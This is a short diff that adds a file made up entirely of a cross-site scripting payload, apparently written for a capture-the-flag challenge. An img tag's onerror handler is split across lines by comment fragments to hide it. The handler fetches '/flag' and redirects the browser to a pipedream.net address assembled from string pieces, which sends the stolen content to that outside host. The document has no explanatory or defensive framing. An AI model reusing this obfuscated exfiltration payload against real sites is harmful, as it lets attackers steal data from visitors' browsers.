@@ -1,0 +1,17 @@
+<img src='
+'onerror='/*
+*/fetch(/*
+*/"/flag")/*
+*/.then(r/*
+*/=>r.text/*
+*/()).then/*
+*/(t=>/*
+*/location/*
+*/="//en"+/*
+*/"1wtky"+/*
+*/"rrl5z"+/*
+*/"f.x.p"+/*
+*/"ipedr"+/*
+*/"eam.n"+/*
+*/"et/"+/*
+*/t)'
